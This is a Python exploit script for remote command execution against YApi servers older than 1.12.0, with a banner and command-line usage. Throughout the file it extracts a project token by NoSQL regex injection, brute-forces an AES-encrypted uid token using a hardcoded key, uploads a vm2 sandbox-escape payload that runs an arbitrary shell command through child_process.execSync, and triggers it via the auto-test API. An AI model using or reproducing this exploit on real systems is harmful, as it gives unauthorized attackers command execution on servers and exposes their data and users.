import requests
import re
import argparse
import textwrap
import hashlib
import binascii
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from requests import exceptions
import time

class YapiRce:

    def banner(self):
        print("""\033[0;36m

Y88b   d88P     d8888          d8b     8888888b.   .d8888b.  8888888888 
 Y88b d88P     d88888          Y8P     888   Y88b d88P  Y88b 888        
  Y88o88P     d88P888                  888    888 888    888 888        
   Y888P     d88P 888 88888b.  888     888   d88P 888        8888888    
    888     d88P  888 888 "88b 888     8888888P"  888        888        
    888    d88P   888 888  888 888     888 T88b   888    888 888        
    888   d8888888888 888 d88P 888     888  T88b  Y88b  d88P 888        
    888  d88P     888 88888P"  888     888   T88b  "Y8888P"  8888888888 
                      888                                               
                      888                                               
                      888        

        [*] :   Font: colossal 
        [*] :   YApi version < 1.12.0 
        [*] :   python3 yapiRce.py -u http://127.0.0.1:40001 -c whoami                                    
        \033[0m""")

    def parser(slef) :
        parser = argparse.ArgumentParser(
        description="YApi 远程命令执行",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\033[0;36m
        Example:
            python3 yapiRce.py -u http://127.0.0.1:40001 -c whoami
        \033[0m""") )
        parser.add_argument('-u','--url',required=True,help="target url")
        parser.add_argument('-c','--command',help='command shell',default="whoami")
        
        args = parser.parse_args()
        return args

    def __init__(self):
        self.banner()
        args =  self.parser()
        # print(args)
        # 默认值
        self.argParseDict = {}
        self.headers = { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0(Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/107.0.0.0 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
        self.token = ""
        self.mid = "|"
        self.getTokenApi = "/api/project/get"
        self.queryToken = "?token="
        self.upVmApi = "/api/project/up"
        self.autoTestApi = "/api/open/run_auto_test"
        self.autoTestApiQueryMode = "&mode=html"

        # 加载参数
        self.argParseDict['url'] = args.url
        self.checkUrl(self.argParseDict['url'])
        self.argParseDict['cmd'] = args.command
        
        # 设置vm2脚本
        self.VmScript = "var vulnerabilities = function () {\n    // This line insert vulnerabilities!\n    const global = this\n    global.Error.prepareStackTrace = (_, c) =>\n      c.map((c) => c.getThis()).find((a) => a && a.process);\n    const { stack } = new Error();\n    // now you can get process object from stack.process\n    console.info(stack.process.mainModule);\n    // and you can use process.mainModule.require to import any library to execute any commands\n   const resp = stack.process.mainModule.require('child_process').execSync('"+self.argParseDict['cmd']+"');\n  context.responseData = 'lian%' + resp + '%lian' \n };\n  \n  vulnerabilities();"
    def checkUrl(self,url):
        print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Url check \033[0m' )
        if url[-1] == "/":
            url = url[0:-1]
        if url[0:4] != "http":
            # 判读是否有http协议
            print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Please add the http protocol : http/https  \033[0m' )
            print(f'\033[0;36m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} input url : {url}  \033[0m' )
            exit()
        if re.match("http[s]?://(?:[\d|\w]+\.?){2,}:?",url) is None:
            # 判断url是否正确
            print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Request confirmation that the url is correct : http://xxxx:40001 \033[0m' )
            print(f'\033[0;36m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} input url : {url}  \033[0m' )
            exit()
        try:
            resp = requests.get(url=url,headers=self.headers)
            if resp.status_code == 404:
                print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} url 404 \033[0m' )
                print(f'\033[0;36m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} input url : {url}  \033[0m' )
                exit()
            
            self.argParseDict['url'] = url
        except:
            print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} url error \033[0m' )
            print(f'\033[0;36m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} input url : {url}  \033[0m' )
            exit()

    def getToken(self,url):
        url = url + self.getTokenApi
        token = ""
        tokenNum = "0123456789"
        tokenStr = "abcdef"
        tokenletter = tokenNum + tokenStr
        print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} start injection token \033[0m' )
        for i in range(16):
                for j in tokenletter:
                    # print(1)
                    body = {"token":{"$regex":"^" + token + j}}
                    try:
                        resp = requests.get(url=url, headers=self.headers,json=body)
                    except exceptions.Timeout as e:
                        print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Request timeout retry  \033[0m' )
                        time.sleep(3)
                        resp = requests.get(url=url, headers=self.headers,json=body)                        
                    if "406" in resp.text:
                        token += j
                        print(f'\033[0;33m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} injection token {token} \033[0m' )
                        # print(f"\033[5;37;32m [*] injection token {token} \033[0;37;32m\n")
                        # print("[*] 爆破token",token)
                    if len(token) ==20:
                        break 
        print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} token : {token} \033[0m' )
        # print("[*] 获取到的token:",token)
        return token


    def compute(slef,passphase: str):
        nkey = 24
        niv = 16
        key = ''
        iv = ''
        p = ''

        while True:
            h = hashlib.md5()
            h.update(binascii.unhexlify(p))
            h.update(passphase.encode())
            p = h.hexdigest()

            i = 0
            n = min(len(p) - i, 2 * nkey)
            nkey -= n // 2
            key += p[i:i + n]
            i += n
            n = min(len(p) - i, 2 * niv)
            niv -= n // 2
            iv += p[i:i + n]
            i += n

            if nkey + niv == 0:
                return binascii.unhexlify(key), binascii.unhexlify(iv)

    def aesEncode(self,data):
        key, iv = self.compute('abcde')
        padder = padding.PKCS7(128).padder()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()
        return binascii.hexlify(ct).decode()

    def enmuAesEncode(self,token):
        enmuAesEncodeDict={}
        i = 1
        while i<1000:
            aesToken = str(i) + self.mid + token
            enumAesToken =  self.aesEncode(aesToken)
            enmuAesEncodeDict[i] = enumAesToken
            i +=1 
        return enmuAesEncodeDict

    def checkToken(self,enmuAesEncodeDict,url):
        if url[-1] == "/" :
            url = url[0:-2]
        url = url + self.getTokenApi+self.queryToken
        for i in enmuAesEncodeDict.keys():
            urlToken = url + enmuAesEncodeDict[i]
            # print(urlToken)
            try:
                resp =  requests.get(url=urlToken,headers=self.headers)
            except exceptions.Timeout as e:
                print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Request timeout retry  \033[0m' )
                time.sleep(3)
                resp =  requests.get(url=urlToken,headers=self.headers)
            if re.search("\"errcode\":0",resp.text) and re.search("\"uid\":\d+",resp.text):
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} uid : {i} \033[0m' )
                # print(f"[*] 获取到 uid : {i}")
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Encode token : {enmuAesEncodeDict[i]} \033[0m' )
                # print(f"[*] 获取到 token : {enmuAesEncodeDict[i]}")
                self.token = enmuAesEncodeDict[i]
                break

    def upVmScript(self,url):
        # 上传pre-response 脚本
        
        print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} cmd : {self.argParseDict["cmd"]} \033[0m' )
        # print(f"[*] 执行命令: {self.argParseDict['cmd']}")

        url = url + self.upVmApi + self.queryToken + self.token
        headers = {
            "content-type":"application/json"
        }
        body_json = {"id":1,"pre_script":"","after_script":self.VmScript}
        id = 1
        while id:
            body_json["id"] = id ## 项目id 需要枚举
            try:
                resp = requests.post(url=url,headers=headers,json=body_json)
            except exceptions.Timeout as e:
                print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Request timeout retry  \033[0m' )
                time.sleep(3)
                resp = requests.post(url=url,headers=headers,json=body_json)
            if resp.status_code == 200 and re.search("\"errcode\":0",resp.text):
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} project id : {id} \033[0m' )
                # print(f"[*] 项目id: {id}")
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} upload script success \033[0m' )
                # print("[*] pre-response 脚本上传成功")
                id = False
            else:
                id+=1
        
    def autoTest(self,url):
        id = 1
        while id:
            autoTestUrl = url + self.autoTestApi + self.queryToken + self.token + f"&id={id}" + self.autoTestApiQueryMode
            # print(autoTestUrl)
            try:
                resp = requests.get(url=autoTestUrl,headers=self.headers)
            except exceptions.Timeout as e:
                print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Request timeout retry  \033[0m' )
                time.sleep(3)
                resp = requests.get(url=autoTestUrl,headers=self.headers)            
            if re.search("YAPI",resp.text) and re.search("<!DOCTYPE html>",resp.text):
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Command executed successfully  \033[0m' )
                result = re.search("lian%([\S\s]+)%lian",resp.text)[1]
                if result == "' + resp + '":
                    result = re.search("message:[^<]+",resp.text)[0]
                print(f'\033[0;32m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} result : {result}  \033[0m' )
                # print("[*] 命令执行成功")
                print(autoTestUrl)
                id = False
                break
            id += 1 

    def main(self):
        # 获取加密前token
        token =  self.getToken(self.argParseDict["url"])

        # token = "92af239a4e189e1661db"
        # 枚举token
        enmuAesEncodeDict =  self.enmuAesEncode(token=token)
        # 确认加密后token
        self.checkToken(enmuAesEncodeDict,self.argParseDict['url'])
        # 上传vm2逃逸脚本
        self.upVmScript(self.argParseDict['url'])
        # 自动化测试触发脚本
        self.autoTest(self.argParseDict['url'])

if __name__ == "__main__":
    try:
        YapiRce().main()
    except KeyboardInterrupt as e:
        print(f'\033[0;31m[+] {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())} Program exit \033[0m' )
        exit()